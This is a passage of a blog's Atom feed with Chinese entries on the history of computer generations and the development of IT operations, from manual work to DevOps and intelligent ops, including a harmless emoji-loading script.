&#xFF0C;&#x4EE5;&#x7EAA;&#x5FF5;&#x8FD9;&#x4F4D;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x7406;&#x8BBA;&#x7684;&#x5960;&#x57FA;&#x4EBA;&#xFF09;</p><p>1939&#x5E74;&#xFF0C;&#x7F8E;&#x56FD;&#x8863;&#x963F;&#x534E;&#x5DDE;&#x7ACB;&#x5927;&#x5B66;&#x7684;&#x7EA6;&#x7FF0;&#x25AA;&#x963F;&#x5854;&#x7EB3;&#x7D22;&#x592B;&#x6559;&#x6388;&#x548C;&#x4ED6;&#x7684;&#x7814;&#x7A76;&#x751F;&#x514B;&#x91CC;&#x798F;&#x5FB7;&#x25AA;&#x8D1D;&#x91CC;&#x4E00;&#x8D77;&#x5236;&#x4F5C;&#x4E86;&#x4E00;&#x53F0;&#x79F0;&#x4E3A;ABC&#x7684;&#x673A;&#x5668;&#xFF0C;&#x4F46;&#x5176;&#x4EC5;&#x80FD;&#x6C42;&#x89E3;&#x65B9;&#x7A0B;&#x5F0F;&#x7684;&#x4E13;&#x7528;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#xFF1B;</p><p>1944&#x5E74;&#xFF0C;&#x54C8;&#x4F5B;&#x5927;&#x5B66;&#x970D;&#x534E;&#x5FB7;&#x25AA;&#x827E;&#x80AF;&#x535A;&#x58EB;&#x548C;IBM&#x516C;&#x53F8;&#x7684;&#x5DE5;&#x7A0B;&#x5E08;&#x5C0F;&#x7EC4;&#x5408;&#x4F5C;&#xFF0C;&#x4EE5;100&#x4E07;&#x7F8E;&#x5143;&#x7814;&#x5236;&#x4E86;&#x4E00;&#x53F0;&#x79F0;&#x4E3A;Mark-I&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x5B83;&#x4F53;&#x79EF;&#x5927;&#xFF0C;&#x8FD0;&#x7B97;&#x901F;&#x5EA6;&#x4E5F;&#x6162;&#xFF0C;&#x4E14;&#x4EC5;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x7535;&#x5B50;&#x5F0F;&#x7684;&#xFF0C;&#x53E6;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x673A;&#x68B0;&#x5F0F;&#x7684;&#xFF1B;</p><p>1946&#x5E74;&#xFF0C;&#x5BBE;&#x5915;&#x6CD5;&#x5C3C;&#x4E9A;&#x5927;&#x5B66;&#x7684;&#x7EA6;&#x7FF0;&#x25AA;&#x83AB;&#x514B;&#x83B1;&#x548C;&#x4ED6;&#x7684;&#x7814;&#x7A76;&#x751F;&#x666E;&#x96F7;&#x65AF;&#x5E15;&#x25AA;&#x57C3;&#x514B;&#x7279;&#x4E00;&#x8D77;&#x7814;&#x5236;&#x4E86;ENIAC&#xFF08;&#x7535;&#x5B50;&#x6570;&#x5B57;&#x79EF;&#x5206;&#x8BA1;&#x7B97;&#x673A;&#xFF09;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x662F;&#x516C;&#x8BA4;&#x7684;&#x4E16;&#x754C;&#x4E0A;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x8BE5;&#x8BA1;&#x7B97;&#x673A;&#x91C7;&#x53D6;&#x4E86;&#x666E;&#x6797;&#x65AF;&#x987F;&#x5927;&#x5B66;&#x6570;&#x5B66;&#x6559;&#x6388; &#x51AF;&#x25AA;&#x4F0A;&#x8BFA;&#x66FC; &#x201C;&#x5B58;&#x50A8;&#x7A0B;&#x5E8F;&#x201D;&#x7684;&#x5EFA;&#x8BAE;&#xFF08;&#x628A;&#x8BA1;&#x7B97;&#x673A;&#x7A0B;&#x5E8F;&#x4E0E;&#x6570;&#x636E;&#x4E00;&#x8D77;&#x5B58;&#x50A8;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x65B9;&#x4FBF;&#x5730;&#x8FD4;&#x56DE;&#x524D;&#x9762;&#x7684;&#x6307;&#x4EE4;&#x6216;&#x53CD;&#x590D;&#x6267;&#x884C;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;ENIAC&#x5728;&#x64CD;&#x4F5C;&#x4E0A;&#x7684;&#x4E0D;&#x4FBF;&#xFF09;&#xFF1B;</p><p>&#x4E00;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5171;&#x540C;&#x7279;&#x70B9;&#xFF1A;&#x903B;&#x8F91;&#x5668;&#x4EF6;&#x4F7F;&#x7528;&#x7535;&#x5B50;&#x7BA1;&#xFF1B;&#x7528;&#x7A7F;&#x5B54;&#x5361;&#x7247;&#x673A;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x548C;&#x6307;&#x4EE4;&#x7684;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#xFF1B;&#x7528;&#x78C1;&#x9F13;&#x6216;&#x78C1;&#x5E26;&#x4F5C;&#x4E3A;&#x5916;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x4F7F;&#x7528;&#x673A;&#x5668;&#x8BED;&#x8A00;&#x7F16;&#x7A0B;&#x3002;</p><p><strong>2&#xFF1A;&#x7B2C;&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1958-1964&#xFF09;</strong></p><p>&#x5728;&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#x6676;&#x4F53;&#x7BA1;&#xFF0C;&#x4E0E;&#x4E00;&#x4EE3;&#x673A;&#x76F8;&#x6BD4;&#xFF0C;&#x5B83;&#x4F53;&#x79EF;&#x5C0F;&#xFF0C;&#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x80FD;&#x8017;&#x4F4E;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#x9AD8;&#xFF1B;</p><p>&#x9AD8;&#x7EA7;&#x7A0B;&#x5E8F;&#x8BED;&#x8A00;&#x7684;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#xFF0C;&#x5C06;&#x8BA1;&#x7B97;&#x673A;&#x4ECE;&#x5C11;&#x6570;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#x624B;&#x4E2D;&#x89E3;&#x653E;&#x51FA;&#x6765;&#xFF0C;&#x63A8;&#x8FDB;&#x4E86;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x666E;&#x53CA;&#x4E0E;&#x5E94;&#x7528;&#xFF1B;</p><p>&#x4E8C;&#x4EE3;&#x673A;&#x5668;&#x4E2D;&#x8F93;&#x5165;&#x3001;&#x8F93;&#x51FA;&#x8BBE;&#x5907;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;&#x65E0;&#x6CD5;&#x4E0E;&#x4E3B;&#x673A;&#x7684;&#x8BA1;&#x7B97;&#x901F;&#x5EA6;&#x76F8;&#x5339;&#x914D;&#x3002;</p><p>&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7279;&#x70B9;&#x4E3A;&#xFF1A;&#x7528;&#x6676;&#x4F53;&#x7BA1;&#x4EE3;&#x66FF;&#x7535;&#x5B50;&#x7BA1;&#xFF1B;&#x5185;&#x5B58;&#x50A8;&#x5668;&#x91C7;&#x7528;&#x4E86;&#x78C1;&#x5FC3;&#x4F53;&#xFF1B;&#x5F15;&#x5165;&#x4E86;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x6D6E;&#x70B9;&#x8FD0;&#x7B97;&#x786C;&#x4EF6;&#xFF1B;&#x5229;&#x7528; I/O &#x5904;&#x7406;&#x673A;&#x63D0;&#x9AD8;&#x4E86;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x80FD;&#x529B;&#xFF1B;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x914D;&#x7F6E;&#x4E86;&#x5B50;&#x7A0B;&#x5E8F;&#x5E93;&#x548C;&#x6279;&#x5904;&#x7406;&#x7BA1;&#x7406;&#x7A0B;&#x5E8F;&#x3002;</p><p><strong>3&#xFF1A;&#x7B2C;&#x4E09;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1965-1971&#xFF09;</strong></p><p>1958&#x5E74;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x95EE;&#x4E16;&#xFF08;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x5C31;&#x662F;&#x5C06;&#x5927;&#x91CF;&#x7684;&#x6676;&#x4F53;&#x7BA1;&#x548C;&#x7535;&#x5B50;&#x7EBF;&#x8DEF;&#x7EC4;&#x5408;&#x5728;&#x4E00;&#x5757;&#x7845;&#x6676;&#x7247;&#x4E0A;&#xFF0C;&#x6545;&#x79F0;&#x4E3A;&#x82AF;&#x7247;&#xFF09;&#x3002;</p><p>&#x4E09;&#x4EE3;&#x8BA1;&#x7B97;&#x7684;&#x7279;&#x70B9;&#xFF1A;&#x7528;&#x5C0F;&#x89C4;&#x6A21;&#xFF08;100&#x4EE5;&#x4E0B;&#x5143;&#x4EF6;&#xFF09;&#x6216;&#x4E2D;&#x89C4;&#x6A21;&#xFF08;100-1000&#x5143;&#x4EF6;&#xFF09;&#x7684;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x6765;&#x4EE3;&#x66FF;&#x6676;&#x4F53;&#x7BA1;&#x7B49;&#x5206;&#x7ACB;&#x5143;&#x4EF6;&#xFF1B;&#x7528;&#x534A;&#x5BFC;&#x4F53;&#x5B58;&#x50A8;&#x5668;&#x4EE3;&#x66FF;&#x78C1;&#x5FC3;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x4F7F;&#x7528;&#x5FAE;&#x7A0B;&#x5E8F;&#x8BBE;&#x8BA1;&#x6280;&#x672F;&#x7B80;&#x5316;&#x5904;&#x7406;&#x673A;&#x7684;&#x7ED3;&#x6784;&#xFF1B;&#x5728;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x5E7F;&#x6CDB;&#x5F15;&#x5165;&#x591A;&#x9053;&#x7A0B;&#x5E8F;&#x3001;&#x5E76;&#x884C;&#x5904;&#x7406;&#x3001;&#x865A;&#x62DF;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x4EE5;&#x53CA;&#x529F;&#x80FD;&#x5B8C;&#x5907;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x5927;&#x91CF;&#x9762;&#x5411;&#x7528;&#x6237;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;</p><p><strong>4&#xFF1A;&#x7B2C;&#x56DB;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1972&#x5E74;&#x81F3;&#x4ECA;&#xFF09;</strong></p><p>&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x8BDE;&#x751F;&#x662F;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x5E94;&#x7528;&#x7684;&#x76F4;&#x63A5;&#x7ED3;&#x679C;&#xFF0C;1975&#x5E74;&#x7B2C;&#x4E00;&#x53F0;&#x5546;&#x4E1A;&#x5316;&#x7684;&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A; MITS Altair &#x95EE;&#x4E16;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x4E86;Intel&#x516C;&#x53F8;&#x7684;8080&#x82AF;&#x7247;&#xFF1B;</p><p>&#x65F6;&#x81F3;&#x4ECA;&#x65E5;&#xFF0C;&#x5954;&#x817E;&#x7CFB;&#x5217;&#x5FAE;&#x5904;&#x7406;&#x5668;&#x5E94;&#x8FD0;&#x800C;&#x751F;&#xFF0C;&#x73B0;&#x5728;&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x4F53;&#x79EF;&#x8D8A;&#x6765;&#x8D8A;&#x5C0F;&#x3001;&#x6027;&#x80FD;&#x8D8A;&#x6765;&#x5F3A;&#x3001;&#x53EF;&#x9760;&#x6027;&#x8D8A;&#x6765;&#x8D8A;&#x9AD8;&#x3001;&#x4EF7;&#x683C;&#x8D8A;&#x6765;&#x8D8A;&#x4F4E;&#x3001;&#x5E94;&#x7528;&#x8303;&#x56F4;&#x8D8A;&#x6765;&#x8D8A;&#x5E7F;&#xFF0C;&#x52A0;&#x4E0A;&#x5B8C;&#x5584;&#x7684;&#x7CFB;&#x7EDF;&#x8F6F;&#x4EF6;&#x3001;&#x4E30;&#x5BCC;&#x7684;&#x7CFB;&#x7EDF;&#x5F00;&#x53D1;&#x5DE5;&#x5177;&#x548C;&#x5546;&#x54C1;&#x5316;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5927;&#x91CF;&#x6D8C;&#x73B0;&#xFF0C;&#x901A;&#x4FE1;&#x6280;&#x672F;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x7684;&#x98DE;&#x901F;&#x53D1;&#x5C55;&#xFF0C;&#x4F7F;&#x5F97;&#x8BA1;&#x7B97;&#x673A;&#x8FDB;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x53D1;&#x5C55;&#x7684;&#x9636;&#x6BB5;&#x3002;</p><p>&#x7B2C;&#x56DB;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x6700;&#x4E3A;&#x663E;&#x8457;&#x7684;&#x7279;&#x5F81;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x5927;&#x89C4;&#x6A21;&#xFF08;1000-10000&#xFF09;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x548C;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF08;10000&#x4EE5;&#x4E0A;&#xFF09;&#xFF1B;&#x4F7F;&#x7528;&#x5927;&#x5BB9;&#x91CF;&#x7684;&#x534A;&#x5BFC;&#x4F53;&#x4F5C;&#x4E3A;&#x5185;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x5728;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x65B9;&#x9762;&#x8FDB;&#x4E00;&#x6B65;&#x53D1;&#x5C55;&#x4E86;&#x5E76;&#x884C;&#x5904;&#x7406;&#x3001;&#x591A;&#x673A;&#x7CFB;&#x7EDF;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x7CFB;&#x7EDF;&#xFF1B;&#x5728;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x63A8;&#x51FA;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4EE5;&#x53CA;&#x8F6F;&#x4EF6;&#x5DE5;&#x7A0B;&#x6807;&#x51C6;&#x7B49;&#x3002;</p><p><strong>5&#xFF1A;&#x7B2C;&#x4E94;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;</strong></p><p>&#x4E94;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x5C1A;&#x5728;&#x7814;&#x5236;&#x4E4B;&#x4E2D;&#xFF0C;&#x7814;&#x7A76;&#x76EE;&#x6807;&#x662F;&#x8BD5;&#x56FE;&#x6253;&#x7834;&#x8BA1;&#x7B97;&#x673A;&#x73B0;&#x6709;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#xFF0C;&#x4F7F;&#x5F97;&#x8BA1;&#x7B97;&#x673A;&#x80FD;&#x591F;&#x5177;&#x6709;&#x50CF;&#x4EBA;&#x90A3;&#x6837;&#x7684;&#x601D;&#x7EF4;&#x3001;&#x63A8;&#x7406;&#x548C;&#x5224;&#x65AD;&#x80FD;&#x529B;&#xFF08;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#xFF09;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;计算机概述&quot;&gt;&lt;a href=&quot;#计算机概述&quot; class=&quot;headerlink&quot; title=&quot;计算机概述&quot;&gt;&lt;/a&gt;计算机概述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;今天1024，浅谈以下计算机历史….&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;计算机发展的历史&quot;&gt;&lt;a href=&quot;#计算机发展的历史&quot; class=&quot;headerlink&quot; title=&quot;计算机发展的历史&quot;&gt;&lt;/a&gt;计算机发展的历史&lt;/h3&gt;&lt;p&gt;自古以来人类就在不断地发明和改进计算工具，从结绳计数到算盘，计算尺，手摇计算机，直到1946年第一台电子计算机诞生，虽然电子计算机至今虽然只有短短的半个多世纪，但取得了惊人的发展吗，已经经历了五代的变革。计算机的发展和电子技术的发展密切相关，故每次电子技术有突破性的发展，就会导致计算机的一次重大变革。所以计算机发展史中的 ‘’代‘’ 通常以其所使用的主要器件来划分的（电子管，晶体管，集成电路，大规模集成电路，超大规模集成电路）。此外，各个阶段所配置的软件和使用方法也有不同的特点，成为划分 “代” 的标志之一。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>运维发展史</title>
    <link href="https://marnm.github.io//posts/dded0e80/"/>
    <id>https://marnm.github.io//posts/dded0e80/</id>
    <published>2020-09-26T12:35:45.000Z</published>
    <updated>2022-05-26T12:38:03.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;"><a href="#&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;" class="headerlink" title="&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;"></a>&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;</h3><p>&#x63D0;&#x5230;&#x8FD0;&#x7EF4;&#x5F88;&#x591A;&#x4EBA;&#x53EF;&#x80FD;&#x60F3;&#x5230; IT&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x5176;&#x5B9E;&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x4E0D;&#x4EC5;&#x4EC5;&#x6700;&#x8FD1;&#x51E0;&#x5341;&#x5E74;&#x624D;&#x6709;&#x7684;&#x5DE5;&#x4F5C;&#x5C97;&#x4F4D;&#xFF0C;&#x5927;&#x591A;&#x8FD0;&#x7EF4;&#x7684;&#x7406;&#x5FF5;&#x90FD;&#x6765;&#x81EA;&#x4EBA;&#x7C7B;&#x533B;&#x7597;&#x754C;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x533B;&#x751F;&#x662F;&#x5BF9;&#x4EBA;&#x4F53;&#x8FD9;&#x4E2A;&#x8D85;&#x7EA7;&#x590D;&#x6742;&#x7CFB;&#x7EDF;&#x505A;&#x8FD0;&#x7EF4;&#xFF0C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x8FD0;&#x7EF4;&#x7684;&#x662F;IT&#x7CFB;&#x7EDF;&#x800C;&#x5DF2;&#x3002;&#x533B;&#x751F;&#x901A;&#x8FC7;&#x5BF9;&#x751F;&#x547D;&#x4EE5;&#x53CA;&#x751F;&#x6D3B;&#x7684;&#x5404;&#x79CD;&#x89C2;&#x5BDF;&#x4E0E;&#x8861;&#x91CF;&#x6765;&#x7EF4;&#x62A4;&#x751F;&#x547D;&#x7684;&#x6B63;&#x5E38;&#x72B6;&#x6001;&#x4E0E;&#x8FD0;&#x884C;&#xFF1B;&#x800C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF1A;&#x901A;&#x8FC7;&#x5BF9;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x7684;&#x5404;&#x79CD;&#x89C2;&#x5BDF;&#x4E0E;&#x8861;&#x91CF;&#x6765;&#x7EF4;&#x62A4;&#x7CFB;&#x7EDF;&#x7684;&#x6B63;&#x5E38;&#x72B6;&#x6001;&#x4E0E;&#x8FD0;&#x884C;&#xFF0C;&#x5982;&#x533B;&#x751F;&#x901A;&#x8FC7;&#x8840;&#x5E38;&#x89C4;&#x3001;&#x5C3F;&#x68C0;&#x7B49;&#x7B49;&#x89C2;&#x6D4B;&#x6307;&#x6807;&#x518D;&#x6839;&#x636E;&#x5386;&#x53F2;&#x7ECF;&#x9A8C;&#x6765;&#x8BC4;&#x4F30;&#x4E00;&#x4E2A;&#x4EBA;&#x7684;&#x8EAB;&#x4F53;&#x72B6;&#x6001;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x901A;&#x8FC7;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6307;&#x6807;KPI&#x53D8;&#x5316;&#x3001;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x7684;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#x627E;&#x56E0;&#x679C;&#x5173;&#x7CFB;&#x6765;&#x5B9A;&#x754C;&#x5B9A;&#x4F4D;&#x6545;&#x969C;&#xFF1B;&#x518D;&#x5982;&#x533B;&#x751F;&#x901A;&#x8FC7;X&#x5C04;&#x7EBF;&#x62CD;CT&#x3001;&#x62CD;&#x80F8;&#x7247;&#x6765;&#x900F;&#x89C6;&#x4EBA;&#x4F53;&#x8FDB;&#x4E00;&#x6B65;&#x89C2;&#x6D4B;&#x4EBA;&#x4F53;&#x7EC6;&#x5FAE;&#x53D8;&#x5316;&#x6765;&#x63A8;&#x65AD;&#x75C5;&#x56E0;&#xFF0C;&#x800C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5219;&#x4F1A;&#x628A;&#x6545;&#x969C;&#x5355;&#x5143;suspend&#x4F4F;&#xFF0C;&#x653E;&#x8BCA;&#x65AD;&#x5668;&#x8FDB;&#x884C;&#x8BCA;&#x65AD;&#xFF0C;&#x626B;&#x63CF;&#x5185;&#x5B58;&#x5806;&#x6808;&#x7B49;&#x6545;&#x969C;&#x73B0;&#x573A;&#x4FE1;&#x606F;&#x63A8;&#x5230;&#x51FA;&#x6545;&#x969C;&#x6839;&#x56E0;&#x7B49;&#x7B49;&#xFF0C;&#x5F88;&#x591A;&#x8FD0;&#x7EF4;&#x7406;&#x5FF5;&#x6765;&#x81F3;&#x533B;&#x5B66;&#x754C;&#x3002;&#x4F34;&#x968F;&#x79D1;&#x6280;&#x7684;&#x53D1;&#x5C55;&#x533B;&#x7597;&#x8BCA;&#x65AD;&#x624B;&#x6BB5;&#x5728;&#x4E0D;&#x65AD;&#x6F14;&#x8FDB;&#xFF0C;&#x4E0E;&#x533B;&#x7597;&#x754C;&#x4E00;&#x6837;&#x8FD0;&#x7EF4;&#x4E5F;&#x6709;&#x5176;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x3002;</p><a id="more"></a><h3 id="IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;"><a href="#IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;" class="headerlink" title="IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;"></a>IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;</h3><p>&#x4E8B;&#x7269;&#x7684;&#x53D1;&#x5C55;&#x4E0D;&#x662F;&#x5B64;&#x7ACB;&#x7684;&#xFF0C;&#x8FD0;&#x7EF4;&#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF0C;&#x5B83;&#x4E0E;&#x4E1A;&#x754C;&#x7684;&#x6574;&#x4E2A;&#x6280;&#x672F;&#x8D8B;&#x52BF;&#x53D1;&#x5C55;&#x662F;&#x76F8;&#x8F85;&#x76F8;&#x6210;&#x7684;&#x3002;&#x8FD9;&#x5C31;&#x8981;&#x6C42;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x8FD0;&#x7EF4;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x4E5F;&#x8981;&#x5173;&#x6CE8;&#x6574;&#x4E2A;&#x6280;&#x672F;&#x8D8B;&#x52BF;&#x548C;&#x80CC;&#x666F;&#x6765;&#x8BF4;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#xFF1B;&#x4ECE;&#x4E0D;&#x540C;&#x7EF4;&#x5EA6;&#x5BF9;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x5386;&#x7A0B;&#x8FDB;&#x884C;&#x603B;&#x7ED3;&#xFF0C;&#x5982;&#x6309;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7A0B;&#x5EA6;&#x7EF4;&#x5EA6;&#x53EF;&#x628A;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x7C97;&#x7565;&#x5206;&#x4E3A;&#xFF1A;&#x624B;&#x52A8;&#x8FD0;&#x7EF4;-&gt;&#x81EA;&#x52A8;&#x8FD0;&#x7EF4;-&gt;DevOps-&gt;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#xFF1B;&#x5176;&#x4E2D;&#x5728;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6700;&#x65E9;&#x51FA;&#x73B0;&#x7684;&#x662F;&#x624B;&#x5DE5;&#x8FD0;&#x7EF4;&#xFF1B;&#x5728;&#x5927;&#x91CF;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x811A;&#x672C;&#x4EA7;&#x751F;&#x540E;&#xFF0C;&#x5C31;&#x6709;&#x4E86;&#x81EA;&#x52A8;&#x5316;&#x7684;&#x8FD0;&#x7EF4;&#xFF1B;&#x540E;&#x6765;&#x968F;&#x7740;&#x5FAE;&#x670D;&#x52A1;&#x3001;&#x5BB9;&#x5668;&#x6280;&#x672F;&#x5174;&#x8D77;&#x53C8;&#x51FA;&#x73B0;&#x4E86;DevOps&#xFF1B;&#x6700;&#x8FD1;&#x4E00;&#x4E24;&#x5E74;&#x968F;&#x6570;&#x636E;&#x79EF;&#x7D2F;&#x3001;&#x8BA1;&#x7B97;&#x673A;&#x7B97;&#x529B;&#x63D0;&#x5347;&#x53C8;&#x51FA;&#x73B0;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x3002;&#x672C;&#x6587;&#x91CD;&#x70B9;&#x4ECE;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x7EF4;&#x5EA6;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x548C;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7EC6;&#x7C92;&#x5EA6;&#x5212;&#x5206;&#x8FD0;&#x7EF4;&#x5386;&#x7A0B;&#xFF1A;</p><p><strong>&#x7B2C;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x4EBA;&#x5DE5;&#x4F5C;&#x574A;&#x9636;&#x6BB5;&#xFF0C;&#x6700;&#x521D;IT&#x7CFB;&#x7EDF;&#x5F53;&#x6211;&#x4EEC;&#x9047;&#x5230;&#x7684;&#x6240;&#x6709;&#x8FD0;&#x7EF4;&#x95EE;&#x9898;&#xFF0C;&#x57FA;&#x672C;&#x9760;&#x4EBA;&#x5DE5;&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x89C4;&#x6A21;&#x4E0D;&#x5927;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x76F8;&#x5BF9;&#x7B80;&#x5355;&#xFF0C;&#x5927;&#x591A;&#x96C6;&#x4E2D;&#x5728;&#x786C;&#x4EF6;&#x3001;&#x7F51;&#x7EDC;&#x548C;&#x7CFB;&#x7EDF;&#x5C42;&#x9762;&#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x4E00;&#x5B9A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6216;&#x7F51;&#x7EDC;&#x7EF4;&#x62A4;&#x7ECF;&#x9A8C;&#x7684;&#x4EBA;&#x5C31;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#x3002;&#x8FD9;&#x79CD;&#x573A;&#x666F;&#x4E0B;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x8BF4;&#x7684; 